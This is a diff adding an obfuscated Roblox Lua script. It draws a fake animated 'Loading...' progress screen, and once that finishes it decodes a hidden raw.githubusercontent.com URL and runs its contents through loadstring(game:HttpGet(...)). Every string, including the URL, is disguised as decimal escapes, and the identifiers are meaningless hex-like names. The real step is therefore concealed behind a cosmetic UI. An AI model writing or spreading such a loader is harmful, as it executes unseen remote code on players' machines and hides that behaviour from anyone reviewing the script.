@@ -1,0 +1,159 @@
+local _0x1a2b3c = game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101")
+local _0x4d5e6f = game:GetService("\80\108\97\121\101\114\115")
+local _0x7g8h9i = _0x4d5e6f.LocalPlayer
+local _0x1j2k3l = _0x7g8h9i:WaitForChild("\80\108\97\121\101\114\71\117\105")
+if _0x1j2k3l:FindFirstChild("\76\111\97\100\105\110\103\85\73") then return end
+local _0x4m5n6o = Instance.new("\83\99\114\101\101\110\71\117\105")
+_0x4m5n6o.Name = "\76\111\97\100\105\110\103\85\73"
+_0x4m5n6o.ResetOnSpawn = false
+_0x4m5n6o.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+_0x4m5n6o.Parent = _0x1j2k3l
+local _0x7p8q9r = Instance.new("\70\114\97\109\101")
+_0x7p8q9r.Name = "\77\97\105\110\70\114\97\109\101"
+_0x7p8q9r.Size = UDim2.new(1, 0, 1, 0)
+_0x7p8q9r.Position = UDim2.new(0, 0, 0, 0)
+_0x7p8q9r.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+_0x7p8q9r.BorderSizePixel = 0
+_0x7p8q9r.Parent = _0x4m5n6o
+local _0x1s2t3u = Instance.new("\70\114\97\109\101")
+_0x1s2t3u.Name = "\76\111\97\100\105\110\103\67\111\110\116\97\105\110\101\114"
+_0x1s2t3u.Size = UDim2.new(0, 400, 0, 30)
+_0x1s2t3u.Position = UDim2.new(0.5, -200, 0.5, -15)
+_0x1s2t3u.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+_0x1s2t3u.BorderSizePixel = 0
+_0x1s2t3u.Parent = _0x7p8q9r
+local _0x4v5w6x = Instance.new("\85\73\67\111\114\110\101\114")
+_0x4v5w6x.CornerRadius = UDim.new(0, 15)
+_0x4v5w6x.Parent = _0x1s2t3u
+local _0x7y8z9a = Instance.new("\70\114\97\109\101")
+_0x7y8z9a.Name = "\80\114\111\103\114\101\115\115\66\97\114"
+_0x7y8z9a.Size = UDim2.new(0, 0, 1, 0)
+_0x7y8z9a.Position = UDim2.new(0, 0, 0, 0)
+_0x7y8z9a.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+_0x7y8z9a.BorderSizePixel = 0
+_0x7y8z9a.Parent = _0x1s2t3u
+local _0x1b2c3d = Instance.new("\85\73\67\111\114\110\101\114")
+_0x1b2c3d.CornerRadius = UDim.new(0, 15)
+_0x1b2c3d.Parent = _0x7y8z9a
+local _0x4e5f6g = Instance.new("\85\73\71\114\97\100\105\101\110\116")
+_0x4e5f6g.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(0, 162, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 200, 255)),
+    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(0, 162, 255))
+}
+_0x4e5f6g.Rotation = 45
+_0x4e5f6g.Parent = _0x7y8z9a
+local _0x7h8i9j = Instance.new("\70\114\97\109\101")
+_0x7h8i9j.Name = "\83\104\105\110\101"
+_0x7h8i9j.Size = UDim2.new(0, 60, 1, 0)
+_0x7h8i9j.Position = UDim2.new(0, -60, 0, 0)
+_0x7h8i9j.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_0x7h8i9j.BackgroundTransparency = 0.7
+_0x7h8i9j.BorderSizePixel = 0
+_0x7h8i9j.Parent = _0x7y8z9a
+local _0x1k2l3m = Instance.new("\85\73\67\111\114\110\101\114")
+_0x1k2l3m.CornerRadius = UDim.new(0, 15)
+_0x1k2l3m.Parent = _0x7h8i9j
+local _0x4n5o6p = Instance.new("\85\73\71\114\97\100\105\101\110\116")
+_0x4n5o6p.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(255, 255, 255))
+}
+_0x4n5o6p.Transparency = NumberSequence.new{
+    NumberSequenceKeypoint.new(0.0, 1),
+    NumberSequenceKeypoint.new(0.5, 0.3),
+    NumberSequenceKeypoint.new(1.0, 1)
+}
+_0x4n5o6p.Rotation = 90
+_0x4n5o6p.Parent = _0x7h8i9j
+local _0x7q8r9s = Instance.new("\84\101\120\116\76\97\98\101\108")
+_0x7q8r9s.Name = "\76\111\97\100\105\110\103\84\101\120\116"
+_0x7q8r9s.Size = UDim2.new(0, 400, 0, 50)
+_0x7q8r9s.Position = UDim2.new(0.5, -200, 0.5, 50)
+_0x7q8r9s.BackgroundTransparency = 1
+_0x7q8r9s.Text = "\76\111\97\100\105\110\103\46\46\46"
+_0x7q8r9s.TextColor3 = Color3.fromRGB(255, 255, 255)
+_0x7q8r9s.TextScaled = true
+_0x7q8r9s.Font = Enum.Font.GothamBold
+_0x7q8r9s.Parent = _0x7p8q9r
+local _0x1t2u3v = Instance.new("\84\101\120\116\76\97\98\101\108")
+_0x1t2u3v.Name = "\80\101\114\99\101\110\116\84\101\120\116"
+_0x1t2u3v.Size = UDim2.new(0, 100, 0, 25)
+_0x1t2u3v.Position = UDim2.new(0.5, -50, 0.5, -50)
+_0x1t2u3v.BackgroundTransparency = 1
+_0x1t2u3v.Text = "\48\37"
+_0x1t2u3v.TextColor3 = Color3.fromRGB(255, 255, 255)
+_0x1t2u3v.TextScaled = true
+_0x1t2u3v.Font = Enum.Font.Gotham
+_0x1t2u3v.Parent = _0x7p8q9r
+local _0x4w5x6y = false
+local function _0x7z8a9b()
+    local _0xc1d2e3 = 4
+    local _0xf4g5h6 = 100
+    local _0xi7j8k9 = _0xc1d2e3 / _0xf4g5h6
+    for _0xl1m2n3 = 1, _0xf4g5h6 do
+        local _0xo4p5q6 = _0xl1m2n3 / _0xf4g5h6
+        local _0xr7s8t9 = _0x1a2b3c:Create(
+            _0x7y8z9a,
+            TweenInfo.new(_0xi7j8k9, Enum.EasingStyle.Linear),
+            {Size = UDim2.new(_0xo4p5q6, 0, 1, 0)}
+        )
+        _0xr7s8t9:Play()
+        _0x1t2u3v.Text = math.floor(_0xo4p5q6 * 100) .. "\37"
+        if _0xo4p5q6 > 0.1 then
+            local _0xu1v2w3 = _0x1a2b3c:Create(
+                _0x7h8i9j,
+                TweenInfo.new(0.5, Enum.EasingStyle.Linear),
+                {Position = UDim2.new(_0xo4p5q6 - 0.15, 0, 0, 0)}
+            )
+            _0xu1v2w3:Play()
+        end
+        _0xr7s8t9.Completed:Wait()
+    end
+    _0x7y8z9a.Size = UDim2.new(1, 0, 1, 0)
+    _0x1t2u3v.Text = "\49\48\48\37"
+    wait(1)
+    local _0xx4y5z6 = _0x1a2b3c:Create(
+        _0x7p8q9r,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+        {BackgroundTransparency = 1}
+    )
+    local _0xa7b8c9 = _0x1a2b3c:Create(
+        _0x1s2t3u,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+        {BackgroundTransparency = 1}
+    )
+    local _0xd1e2f3 = _0x1a2b3c:Create(
+        _0x7y8z9a,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+        {BackgroundTransparency = 1}
+    )
+    local _0xg4h5i6 = _0x1a2b3c:Create(
+        _0x7q8r9s,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+        {TextTransparency = 1}
+    )
+    local _0xj7k8l9 = _0x1a2b3c:Create(
+        _0x1t2u3v,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+        {TextTransparency = 1}
+    )
+    _0xx4y5z6:Play()
+    _0xa7b8c9:Play()
+    _0xd1e2f3:Play()
+    _0xg4h5i6:Play()
+    _0xj7k8l9:Play()
+    _0xx4y5z6.Completed:Wait()
+    _0x4m5n6o:Destroy()
+    if not _0x4w5x6y then
+        _0x4w5x6y = true
+        local _0xm1n2o3, _0xp4q5r6 = pcall(function()
+            loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\83\100\100\110\105\110\52\47\77\105\108\97\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\86\50\46\116\120\116"))()
+        end)
+        if not _0xm1n2o3 then
+            warn("\76\111\105\32\107\104\105\32\108\111\97\100\32\115\99\114\105\112\116\32\99\104\105\110\104\58\32" .. tostring(_0xp4q5r6))
+        end
+    end
+end
+spawn(_0x7z8a9b)
